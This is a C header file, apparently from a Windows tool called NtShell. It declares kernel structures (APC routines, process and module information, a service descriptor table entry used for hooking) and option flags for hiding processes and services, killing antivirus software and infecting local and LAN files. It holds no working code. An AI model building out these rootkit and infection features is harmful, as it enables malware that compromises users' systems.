#include <wtypes.h>
#include <Ntsecapi.h>

// 来自开源软件NtShell

// 进程管理器接口
#define PROCMGR_LISTPROCESS 1
#define PROCMGR_KILLPROCESS 2
#define PROCMGR_RUN 3
#define PROCMGR_FORCEKILLPROCESS 4

#define MSG_NONE 0
#define MSG_RING0_DISABLED 1

typedef struct _ETHREAD *PETHREAD;
typedef short CSHORT;

typedef long NTSTATUS;
typedef char CCHAR;
typedef short CSHORT;
typedef ULONG CLONG;
typedef struct _KTHREAD *PKTHREAD;
typedef struct _ETHREAD *PETHREAD;
typedef struct _OBJECT_TYPE *POBJECT_TYPE;
typedef struct _FILE_OBJECT *PFILE_OBJECT;
typedef CCHAR KPROCESSOR_MODE;
typedef PVOID PRKTHREAD;
typedef struct ACCESS_STATE *PACCESS_STATE;

#define OBJ_KERNEL_HANDLE 0x00000200
#define STATUS_SUCCESS 0x00000000L
#define STATUS_UNSUCCESSFUL 0xC0000001L

#define FLAG_ALLOW_HIDE_PROCESS 1
#define FLAG_ALLOW_RING0 2
#define FLAG_RUN_SERVICE_ALWAYS 4
#define FLAG_AUTO_KILL_AVSOFT 8
#define FLAG_AUTO_INFECT_FILE 16
#define FLAG_AUTO_INFECT_LAN_FILE 32
#define FLAG_RECORD_ERROR 64
#define FLAG_ALLOW_LOAD_DRIVER 128
#define FLAG_ALLOW_HIDE_SERVICE 256
#define FLAG_RING0_OPEN_FILE 512
#define FLAG_AUTO_BACKUP_FILE 1024

typedef
	NTSTATUS
	(*PRING0_ROUTINE)(
	IN PVOID Ring0Argument
	);

typedef
	VOID
	(*PKNORMAL_ROUTINE)(
	IN PVOID NormalContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
	);

typedef
	VOID
	(*PKKERNEL_ROUTINE)(
	IN struct _KAPC *Apc,
	IN OUT PKNORMAL_ROUTINE *NormalRoutine,
	IN OUT PVOID *NormalContext,
	IN OUT PVOID *SystemArgument1,
	IN OUT PVOID *SystemArgument2
	);

typedef
	VOID
	(*PKRUNDOWN_ROUTINE)(
	IN struct _KAPC *Apc
	);


typedef struct _NTSHELL_RESULTSET
{
	WORD ServerVersion;
	WORD ResultClass;
	WORD MessageCode;
	WORD Reserved;
	DWORD ErrorCode;
	DWORD NumberOfResults;
	PVOID* ResultSet;
} NTSHELL_RESULTSET, *PNTSHELL_RESULTSET;

typedef struct _KAPC {
	CSHORT Type;
	CSHORT Size;
	ULONG Spare0;
	struct _KTHREAD *Thread;
	LIST_ENTRY ApcListEntry;
	PKKERNEL_ROUTINE KernelRoutine;
	PKRUNDOWN_ROUTINE RundownRoutine;
	PKNORMAL_ROUTINE NormalRoutine;
	PVOID NormalContext;
	PVOID SystemArgument1;
	PVOID SystemArgument2;
	CCHAR ApcStateIndex;
	CCHAR ApcMode;
	BOOLEAN Inserted;
} KAPC, *PKAPC, *RESTRICTED_POINTER PRKAPC;

typedef struct _PROCMGR_PROCESSKILL
{
	ULONG ProcessId;
} PROCMGR_PROCESSKILL, *PPROCMGR_PROCESSKILL;

typedef LONG KPRIORITY;

typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
} VM_COUNTERS, *PVM_COUNTERS;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
	ULONG ContextSwitchCount;
	LONG State;
	LONG WaitReason;
	ULONG Reserved;
} SYSTEM_THREAD_INFORMATION, * PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	ULONG ProcessId;
	ULONG InheritedFromProcessId;
	ULONG HandleCount;
	ULONG Reserved2[2];
	VM_COUNTERS VmCounters;
	ULONG TotalPrivateBytes;
	IO_COUNTERS IoCounters;
	SYSTEM_THREAD_INFORMATION Threads[5];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef struct _RING0_KILLTHREAD
{
	ULONG ThreadCount;
	ULONG* ThreadArray;
} RING0_KILLTHREAD, *PRING0_KILLTHREAD;

typedef struct _OBJECT_HANDLE_INFORMATION {
	ULONG HandleAttributes;
	ACCESS_MASK GrantedAccess;
} OBJECT_HANDLE_INFORMATION, *POBJECT_HANDLE_INFORMATION;

typedef enum _KAPC_ENVIRONMENT {
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment
} KAPC_ENVIRONMENT;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Reserved[2];
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT Unknown;
	USHORT LoadCount;
	USHORT ModuleNameOffset;
	CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _ServiceDescriptorEntry
{
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //Used only in checked build
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry, *PServiceDescriptorTableEntry;

#define DbgPrint(_string)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)